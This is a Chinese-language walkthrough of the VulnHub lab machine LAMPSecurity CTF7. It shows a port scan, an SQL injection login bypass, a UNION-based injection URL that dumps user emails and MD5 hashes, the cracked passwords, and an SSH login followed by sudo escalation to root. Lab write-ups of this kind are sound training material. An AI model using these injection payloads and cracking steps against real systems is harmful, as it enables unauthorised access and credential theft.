# LAMPSecurity：CTF7

2024-6-4 https://www.vulnhub.com/entry/lampsecurity-ctf7,86/

difficulty: easy

## IP

101.1.0.167

## Scan

Open Port -> 22,80,137,138,139,901,5900,8080,10000

```
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey:
|   1024 418a0d5d596045c4c415f38a8dc09919 (DSA)
|_  2048 66fba3b4747266f492738fbf61ec8b35 (RSA)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.2.15 (CentOS)
|_http-title: Mad Irish Hacking Academy
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.5.10-125.el6 (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
| http-auth:
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Admin :: Mad Irish Hacking Academy
|_Requested resource was /login.php
|_http-open-proxy: Proxy might be redirecting requests
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Login to Webmin
```

先看端口：80、8080、10000，3 个端口都有登陆入口：

http://101.1.0.167/signup

http://101.1.0.167:8080/login.php

http://101.1.0.167:10000/

经过简单测试，发现 http://101.1.0.167:8080/login.php 这个入口存在 sql 注入，用户名输入 `admin' or 1=1 -- -` 就能登陆进去。

http://101.1.0.167:8080/readings.php 可以编辑信息，看看能不能植入 php web shell，经过尝试，发现不能植入 php web shell，特殊字符被转义了。

找到数据库中的 users 表数据，看看能不能爆出的用户能不能 ssh 登陆：

```
http://101.1.0.167/newsletter&id=-1%20union%20select%201,group_concat(username,0x2d,password),3,4,5%20from%20users

brian@localhost.localdomain-e22f07b17f98e0d9d364584ced0e3c18,
john@localhost.localdomain-0d9ff2a4396d6939f80ffe09b1280ee1,
alice@localhost.localdomain-2146bf95e8929874fc63d54f50f1d2e3,
ruby@localhost.localdomain-9f80ec37f8313728ef3e2f218c79aa23,
leon@localhost.localdomain-5d93ceb70e2bf5daa84ec3d0cd2c731a,
julia@localhost.localdomain-ed2539fe892d2c52c42a440354e8e3d5,
michael@localhost.localdomain-9c42a1346e333a770904b2a2b37fa7d3,
bruce@localhost.localdomain-3a24d81c2b9d0d9aaf2f10c6c9757d4e,
neil@localhost.localdomain-4773408d5358875b3764db552a29ca61,
charles@localhost.localdomain-b2a97bcecbd9336b98d59d9324dae5cf,
foo@bar.com-4cb9c8a8048fd02294477fcb1a41191a,
-d41d8cd98f00b204e9800998ecf8427e,
test@nowhere.com-098f6bcd4621d373cade4e832627b4f6
```

经过 hashcat 破解，得到一部分明文密码：

```
ed2539fe892d2c52c42a440354e8e3d5:madrid
4cb9c8a8048fd02294477fcb1a41191a:changeme
5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234
098f6bcd4621d373cade4e832627b4f6:test
b2a97bcecbd9336b98d59d9324dae5cf:chuck33
2146bf95e8929874fc63d54f50f1d2e3:turtles77
9c42a1346e333a770904b2a2b37fa7d3:somepassword
e22f07b17f98e0d9d364584ced0e3c18:my2cents
```

```
julia:madrid
foo:changeme
leon:qwer1234
test:test
charles:chuck33
alice:turtles77
michael:somepassword
brian:my2cents
```

发现 julia:madrid ssh 可以登陆，并且 sudo 具有完整的权限，可以直接提权：

```
[julia@localhost ~]$ sudo -l
[sudo] password for julia:
Matching Defaults entries for julia on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User julia may run the following commands on this host:
    (ALL) ALL
[julia@localhost ~]$ sudo su
[root@localhost julia]# id
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost julia]# cd /root
[root@localhost ~]# ls
anaconda-ks.cfg  install.log  install.log.syslog  lampsec_ctf7.pdf  webmin-1.610-1.noarch.rpm
```
